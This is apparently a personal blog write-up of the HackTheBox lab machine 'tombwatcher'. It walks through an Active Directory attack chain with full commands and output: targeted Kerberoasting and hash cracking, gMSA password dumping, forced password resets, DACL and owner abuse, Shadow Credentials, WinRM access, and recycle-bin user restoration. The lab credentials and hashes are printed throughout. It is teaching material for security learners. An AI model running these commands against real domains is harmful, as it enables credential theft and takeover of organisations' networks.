---
title: HackTheBox - tombwatcher writeup (Windows/Medium)
categories: [HackTheBox]
tags: [hackthebox, tombwatcher, nmap, ADCS, ttl, nxc, smb, bloodhound, bloodhound-python, WriteSPN, AddSelf, ReadGMSAPassword, ForceChangePassword, WriteOwner, REMOTE MANAGEMENT USERS, targetedKerberoast, BloodyAD, gMSADumper.py, dacledit.py, ShadowCredentials, winrm, evil-winrm, certipy, active directory recycle bin, ESC15, EKUwu, CVE-2024-49019, 1.3.6.1.5.5.7.3.2, Client Authentication, Certificate Request Agent, mimikatz, secretsdump.py]
render_with_liquid: false
---

`tombwatcher` is an assume-breach medium windows box where I was given the credentials of `henry`, from there I exploited 6 AD DACL mis-configuations to get the user flag, for priv esc restored a deleted user from active directory recycle bin and used it to exploit a certificate template vulnerable to ESC15 and get Administrator, from there I demonstrated how to restore the original ntlm hash of one of the users I changed their password during the first part of the box

## Recon

I ran `nmap` to find that the machine is a domain controller running active directory services and the domain is `tombwatcher.htb`
```bash
# Nmap 7.97 scan initiated Thu Oct  9 18:15:10 2025 as: nmap -sSVC -vv -oA tombWatcher 10.10.11.72
Nmap scan report for tombwatcher.htb (10.10.11.72)
Host is up, received echo-reply ttl 127 (0.22s latency).
Scanned at 2025-10-09 18:15:10 +01 for 117s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-10 01:06:06Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-10T01:07:30+00:00; +7h50m23s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-10-09T17:02:50
| Not valid after:  2026-10-09T17:02:50
| MD5:     2e1e 8d78 9466 a7db e98c f262 eac8 c3d1
| SHA-1:   2829 7b27 89a5 58fa c429 a14a 53a2 b93f ad26 985a
| SHA-256: d2e0 7ad3 d5cf 6fcc 299c 7749 4c28 7dcc 9691 8c56 427d feec 4aa4 50e9 8c89 0cfc
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-10T01:07:30+00:00; +7h50m24s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-10-09T17:02:50
| Not valid after:  2026-10-09T17:02:50
| MD5:     2e1e 8d78 9466 a7db e98c f262 eac8 c3d1
| SHA-1:   2829 7b27 89a5 58fa c429 a14a 53a2 b93f ad26 985a
| SHA-256: d2e0 7ad3 d5cf 6fcc 299c 7749 4c28 7dcc 9691 8c56 427d feec 4aa4 50e9 8c89 0cfc
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-10T01:07:30+00:00; +7h50m23s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-10-09T17:02:50
| Not valid after:  2026-10-09T17:02:50
| MD5:     2e1e 8d78 9466 a7db e98c f262 eac8 c3d1
| SHA-1:   2829 7b27 89a5 58fa c429 a14a 53a2 b93f ad26 985a
| SHA-256: d2e0 7ad3 d5cf 6fcc 299c 7749 4c28 7dcc 9691 8c56 427d feec 4aa4 50e9 8c89 0cfc
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-10-09T17:02:50
| Not valid after:  2026-10-09T17:02:50
| MD5:     2e1e 8d78 9466 a7db e98c f262 eac8 c3d1
| SHA-1:   2829 7b27 89a5 58fa c429 a14a 53a2 b93f ad26 985a
| SHA-256: d2e0 7ad3 d5cf 6fcc 299c 7749 4c28 7dcc 9691 8c56 427d feec 4aa4 50e9 8c89 0cfc
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
|_ssl-date: 2025-10-10T01:07:30+00:00; +7h50m24s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 20899/tcp): CLEAN (Timeout)
|   Check 2 (port 62863/tcp): CLEAN (Timeout)
|   Check 3 (port 61752/udp): CLEAN (Timeout)
|   Check 4 (port 21241/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-10-10T01:06:52
|_  start_date: N/A
|_clock-skew: mean: 7h50m23s, deviation: 0s, median: 7h50m23s
```

I could also see that the box was running `ADCS` from the previous result
```bash
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-10T01:07:30+00:00; +7h50m24s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
```


### a bit about nmap -vv

> I recently found out about `nmap`'s `-vv` option from watching ippsec videos, which gives pretty useful info:
> - the [TTL](https://en.wikipedia.org/wiki/Time_to_live) which can tell you which `OS` you're scanning (64 for Linux, 127 for windows, different values for other hardware/OSes), and if you find slightly less `TTL`s such as 63, it usually means that OS is one `HOP` away from the main machine, which usually means it's running on a docker container (or by some other means of virtualization)
> - so far it showed me when windows is running `ADCS`
> - other things that I still haven't learned about!
>  
> I used to use `-v` in the past to print ports as `nmap` finds them, but now that I'm introduced to `-vv` it became my default, even tho it generates a lot of other (useless?) noise, such as certificates that were omitted in the previous `nmap` output

I used `nxc` to generate the hosts file for me
```bash
$ nxc smb 10.10.11.72 --generate-hosts-file /etc/hosts
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) (Null Auth:True)
```

which generated the following line
```bash
10.10.11.72     DC01.tombwatcher.htb tombwatcher.htb DC01
```

I tried enumerating `smb` shares but there wasn't anything interesting there
```
$ nxc smb tombwatcher.htb -u henry -p 'H3nry_987TGV!' --shares
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!

SMB         10.10.11.72     445    DC01             [*] Enumerated shares
SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share
```

## user.txt

### bloodhound
from here on a lot of tools work by getting a `TGT`  which requires `kerberos` interactions, so I disabled `ntp` network time synchronization and sync'ed my time with the target machine
```
$ sudo timedatectl set-ntp false
$ sudo ntpdate tombwatcher.htb
 9 Oct 22:13:32 ntpdate[13021]: step time server 10.10.11.72 offset +14401.705923 sec
```

then ran `bloodhound` using `henry`'s credentials
```bash
$ bloodhound-python DC01.tombwatcher.htb -ns 10.10.11.72 -c all -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 01M 02S
INFO: Compressing output into 20251009221539_bloodhound.zip
```

I marked `henry` as owned in bloodhound, and searched for the `shorted paths from owned objects` in the `cypher` tab, and found a pretty straight forward one

![shortest_path_from_owned_objects.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/tombwatcher/shortest_path_from_owned_objects.png)

from there I would be able to log in as `john` as it's a member of the `REMOTE MANAGEMENT USERS` group
![REMOTE_MANAGEMENT_USERS.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/tombwatcher/REMOTE_MANAGEMENT_USERS.png)

### Alfred
I abused `WriteSPN` by performing `targetted kerberoasting` attack to get `alfred` `krb5tgs` hash
```
$ python targetedKerberoast/targetedKerberoast.py -v -d 'tombwatcher.htb' -u henry -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$1a8ba7ab25e51d2a1441196d2c8e61c5$583ba68084c99294941ef881ecda0a57d5dcbbb72ab345c1ddd120bf5872613af701910eb89bdd3edc00cbb4797442e2e48ba55c63a3927d6691b875c032adb0898ed888cf0965b25e8ea88a0b27831af4847ed0b863cc06e54730ed505a8c5b797a8526d4c1cd2dd7c13b0529c76ccd71c81b701519e06d0aeade6ce24cc38982b984b6a3b78c7ccfdcc36db602cfc5e360b41e169fefa1feb126d5d22c7a5dbc8e3d560b4973179af7924c94984284f80e9ef26783bde3ca2ffaaa8c345e72bfcf6c7dd364dd89f873d609a36e1fdd5211ef3b634c22cc10973f24186a8966392fc0b681be1bb69bc0ca1829204dd398a91dde4f28cd06d71488785068c68aeaa9633f408551d5f003ee16ec0389fbc490d885ff2428877692e90fab28a1c03c47a418df755bbec3cec5289176b7b053dbac599b5d0c5d8936e4ed5868898b3f0c7cc3ebcd32b120715a02f3737d9f7f0be17d1f26c141d2fcb83543499386fbb9cfc1bb56669c1aba18ffd0ee63d66d378d163d15612ed5f0f6117a3cd2237711d04f9e25e6821ee2dccbe7eade8cc05bb8ad8ed08c4999ce1c873316d9d8847173091af2f581846b039d4970b3674a7875e66c8582996f0dc40a220c52b27ad3f9eb162870a2e5021e05b20335d312d1c8d06ddd65a99bd0c84bb46658c91983a12f21176a6e5ed0e5871ca26e5e514a88b39944afbb5cc77d2f9d3dc14553ce18285600f79645847193be3f87317f0f3e17f786565b56730f546b987cbd34e15b5875e0e9f43f26e88f7e1198421bb58934bb0f6a567ba2fcff3f1654bbeadae6e7286d29c8377832632b1e6d50552e6cfd9cb8a54dd02c52b29f57a0f7f357ba2aada2e8f708fadaea4da1312fe864e58f3727ebec2199ac500e9871c209f5e41c5f9382acb626865c54703dcc02a2254c0ec6b3787f0c805412bb127cf601b2670b545244806178e147f385f90d2a096ec5fabf8995c2a47106d8fa71f9df6c080a592531e505d4caf6f99827b2bbd16a850dc679c808cb0e407cb62c10495f34d9fa91251fe500f5096e68130b09ef8dbf5b652e1bdb1b384c521e4ba57d8115247f2f293cf3c7866d6d6e039eb54b11d50a127108a5b7a58d232690ddf93da44861bc75b9f8e9162d8e48ac2faa13a8dbdce0b148cbba0bc3f25186d2918777008df83c6996ef00c122a0f75780460c469bbdecc6bd4b5316a58763b200221a3c81121c72f8081fd1f06d5546473fa05e92e80b024892328dc245c7a457e63032e0171b646dabe93271e540fedd118840c3c3869a214c929410c26fd9185467c2b12ca270d00622335805e518a2f615d3714e2a253652e9a17961a6416bc3b431cd59e8f6dd2d89165153a8a6910b162aa40849048a44a02776b5a22a6b98ffb04c8e9c93bec3d7b918ffc5ac7a8557b5304ba8e93a38c53ed8e6ec3c4a92aadf4738e6f63b9d32aa2bb30a57338b4711
[VERBOSE] SPN removed successfully for (Alfred)
```

then I cracked the hash with `john` to recover `alfred`'s password
```bash
$ john alfred_hash --wordlist=$ROCK --format=krb5tgs
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)
1g 0:00:00:00 DONE (2025-09-02 06:32) 25.00g/s 51200p/s 51200c/s 51200C/s 123456..lovers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
$ nxc ldap tombwatcher.htb -u alfred -p basketball
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\alfred:basketball
```

### Ansible_dev$

since `alfred` has `AddSelf` right on the `infrastructure` group I used `bloodyAD` him to it
```bash
$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u alfred -p basketball add groupMember INFRASTRUCTURE alfred
[+] alfred added to INFRASTRUCTURE
```

then read the `NT` hash of `ANSIBLE_DEVS$` computer object using `gMSADumper.py` thanks to the `ReadGMSAPassword` right
```bash
$ python gMSADumper/gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::bf8b11e301f7ba3fdc616e5d4fa01c30
ansible_dev$:aes256-cts-hmac-sha1-96:f36c76683b132f15610b96c7570f8749f7bf7d41bb87339536737fa02ba483b9
ansible_dev$:aes128-cts-hmac-sha1-96:8e2884da3f366cd9faa83445a1ebbf36
```

```bash
$ nxc ldap tombwatcher.htb -u 'ansible_dev$' -H bf8b11e301f7ba3fdc616e5d4fa01c30
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\ansible_dev$:4f46405647993c7d4e1dc1c25dd6ecf4
```

### Sam

then I used that hash to change `sam`'s password thanks to `ForceChangePassword`
```bash
$ net rpc password sam aRLL3VyPFrKU -U tombwatcher.htb/'ansible_dev$%bf8b11e301f7ba3fdc616e5d4fa01c30' -S 10.10.11.72 --pw-nt-hash
$ nxc ldap tombwatcher.htb -u sam -p aRLL3VyPFrKU
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\sam:aRLL3VyPFrKU
```

### John

now that I changed `sam`'s password, I used `WriteOwner` to changed `John`'s owner to `sam`
```bash
$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p aRLL3VyPFrKU set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```

then grant `sam` fullcontrol over `john` using `dacledit.py`
```bash
$ dacledit.py -action write -rights FullControl -principal sam -target john tombwatcher.htb/sam:aRLL3VyPFrKU
/home/jeff/venv/bin/dacledit.py:101: SyntaxWarning: invalid escape sequence '\V'
  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/home/jeff/venv/bin/dacledit.py:110: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/home/jeff/venv/bin/dacledit.py:111: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/home/jeff/venv/bin/dacledit.py:112: SyntaxWarning: invalid escape sequence '\I'
  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/home/jeff/venv/bin/dacledit.py:114: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/home/jeff/venv/bin/dacledit.py:115: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
/home/jeff/venv/bin/dacledit.py:116: SyntaxWarning: invalid escape sequence '\W'
  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/home/jeff/venv/bin/dacledit.py:117: SyntaxWarning: invalid escape sequence '\T'
  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/home/jeff/venv/bin/dacledit.py:118: SyntaxWarning: invalid escape sequence '\D'
  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/home/jeff/venv/bin/dacledit.py:119: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/home/jeff/venv/bin/dacledit.py:120: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/home/jeff/venv/bin/dacledit.py:121: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/home/jeff/venv/bin/dacledit.py:122: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/home/jeff/venv/bin/dacledit.py:123: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
/home/jeff/venv/bin/dacledit.py:124: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
/home/jeff/venv/bin/dacledit.py:125: SyntaxWarning: invalid escape sequence '\H'
  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/home/jeff/venv/bin/dacledit.py:126: SyntaxWarning: invalid escape sequence '\A'
  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
/home/jeff/venv/bin/dacledit.py:127: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20251009-232412.bak
[*] DACL modified successfully!
```

and since the box is running `ADCS` I could perform a `ShadowCredentials` attack to get `john`'s NT hash, otherwise I would have needed to change his password

```bash
$ certipy shadow auto -u sam@tombwatcher.htb -p aRLL3VyPFrKU -account john -dc-ip 10.10.11.72
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '1d28c46902aa4c17b696df6210441cb2'
[*] Adding Key Credential with device ID '1d28c46902aa4c17b696df6210441cb2' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID '1d28c46902aa4c17b696df6210441cb2' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'john@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'john.ccache'
[*] Wrote credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': 04f40866dbf314427b643f4a37d7319c
```

I can check that the hash works with `winrm` login
```bash
$ nxc winrm tombwatcher.htb -u john -H 04f40866dbf314427b643f4a37d7319c
WINRM       10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
WINRM       10.10.11.72     5985   DC01             [+] tombwatcher.htb\john:04f40866dbf314427b643f4a37d7319c (Pwn3d!)
```

from there I used `evil-winrm` to get the user flag
``` bash
$ evil-winrm -i tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
/home/jeff/.gem/ruby/3.4.0/gems/rexml-3.4.2/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...
*Evil-WinRM* PS C:\Users\john\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> ls


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/9/2025  10:02 AM             34 user.txt


*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
fd****************************9c
*Evil-WinRM* PS C:\Users\john\Desktop>
```

## root.txt

once I got on the box I ran `sharphound.exe` to get more information about the domain
``` powershell
*Evil-WinRM* PS C:\Users\john\Documents> cd C:/programdata
*Evil-WinRM* PS C:\programdata> upload SharpHound.exe

Info: Uploading /home/jeff/htb/machines/solved/tombWatcher/foothold/SharpHound.exe to C:\programdata\SharpHound.exe
/home/jeff/.gem/ruby/3.4.0/gems/rexml-3.4.2/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...

Data: 1774248 bytes of 1774248 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> ./SharpHound.exe -c ALL
...
*Evil-WinRM* PS C:\programdata> ls
downl

    Directory: C:\programdata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-        9/15/2018   3:21 AM                Microsoft
d-----        7/24/2025  12:13 PM                Package Cache
d-----       11/15/2024   7:02 PM                regid.1991-06.com.microsoft
d-----        9/15/2018   3:12 AM                SoftwareDistribution
d-----         6/4/2025   4:25 PM                ssh
d-----        9/15/2018   3:12 AM                USOPrivate
d-----       11/15/2024   6:56 PM                USOShared
d-----       11/15/2024   6:53 PM                VMware
-a----        10/9/2025   9:50 PM          38467 20251009215009_BloodHound.zip
-a----        10/9/2025   9:50 PM           1823 NzkzZThmZmEtZjFhYi00OTRmLTgzMzctMWY3N2FmZGE1ZmUy.bin
-a----        10/9/2025   9:41 PM        1330688 SharpHound.exe


*Evil-WinRM* PS C:\programdata> download 20251009215009_BloodHound.zip

Info: Downloading C:\programdata\20251009215009_BloodHound.zip to 20251009215009_BloodHound.zip
Info: Download successful!
*Evil-WinRM* PS C:\programdata>
```

and found that `john` has a `genericAll` on `ADCS` organization unit, that weirdly didn't have any members. as well as the right to enroll on a few certificate templates
![john_genericAll_on_ADCS.jpg](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/tombwatcher/john_genericAll_on_ADCS.png)

next step was to use `certipy ` with the `--vulnerable` flag as `john` to try and find vulnerable certificates but got no results, then dropped the `-vulnerable` flag, just to see who can enroll on the existing certs, and eventually found the following

```
4
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Write Property Enroll           : S-1-5-21-1392491010-1358638721-2126982587-1111
```

this was something that I haven't seen before, an `SID` can enroll into the certificate.

I checked the `SID` on bloodhound, but it couldn't recognize it either
![SID_enroll_to_WEBSERVER_cert.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/tombwatcher/SID_enroll_to_WEBSERVER_cert.png)

eventually I found that bloodhound can't recognize the `SID` because belongs to a deleted user that we can restore from the [active directory recycle bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin?tabs=adac)

### A bit about Active directory recycle bin
from the Microsoft page:

> Active Directory Recycle Bin allows you to preserve and recover accidentally deleted Active Directory objects. When you enable Active Directory Recycle Bin, all link-valued and non-link-valued attributes of the deleted Active Directory objects are preserved. Meaning objects can be restored in their entirety to the same consistent logical state that they were in immediately before deletion. For example, restored user accounts automatically regain all group memberships and corresponding access rights that they had immediately before deletion, within and across domains.

I also found this great article about the subject called [Have You Looked in the Trash?](https://cravaterouge.com/articles/ad-bin/) that explains how the active directory recycle bin can be abused for privilege escalation on windows in details. quick TL;DR quoting from the article:

> When an object (like a user or group) is deleted, it isn’t immediately purged—it’s marked as “deleted” and moved to a hidden container. This preserves all attributes like group memberships, permissions, and SID history, allowing for one-click restoration if needed ...
> 
> If the Recycle Bin is not enabled or the server version is older than 2008 R2, objects are _tombstoned_ instead of being _deleted_. Tombstoned objects appear similar to recycled objects but are restorable. However, they are stripped of most attributes ... Deleted objects may contain sensitive information such as cleartext passwords in fields like `description`, `info` or custom attributes

there is also the fact that once you enable the recycle bin feature it is impossible to disable it which I think is a typical Microsoft based behavior
![you_cant_disable_recylce_bin_lol.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/tombwatcher/you_cant_disable_recylce_bin_lol.png)
### a trick that made me get stuck for about 2 days

as this was my second windows box and I was trying to use `linux` tools as much as possible rather than getting busy with `powershell`, at first I enumerated deleted users that I have permissions to restore with `bloodyad `(it was my first time with most of these tools too), I got 3 users with the same name

```bash
$ bloodyAD --host tombwatcher.htb -d tombwatcher.htb -u john -p :04f40866dbf314427b643f4a37d7319c get writable --include-del

distinguishedName: CN=Deleted Objects,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: CN=john,CN=Users,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: OU=ADCS,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

I shrugged this off at first thinking it was a bug showing the same user 3 times, and issued a command to restore the `"cert_admin"` user
```bash
$ bloodyAD --host tombwatcher.htb -d tombwatcher.htb -u 'john' -p :04f40866dbf314427b643f4a37d7319c set restore cert_admin
[+] cert_admin has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
```

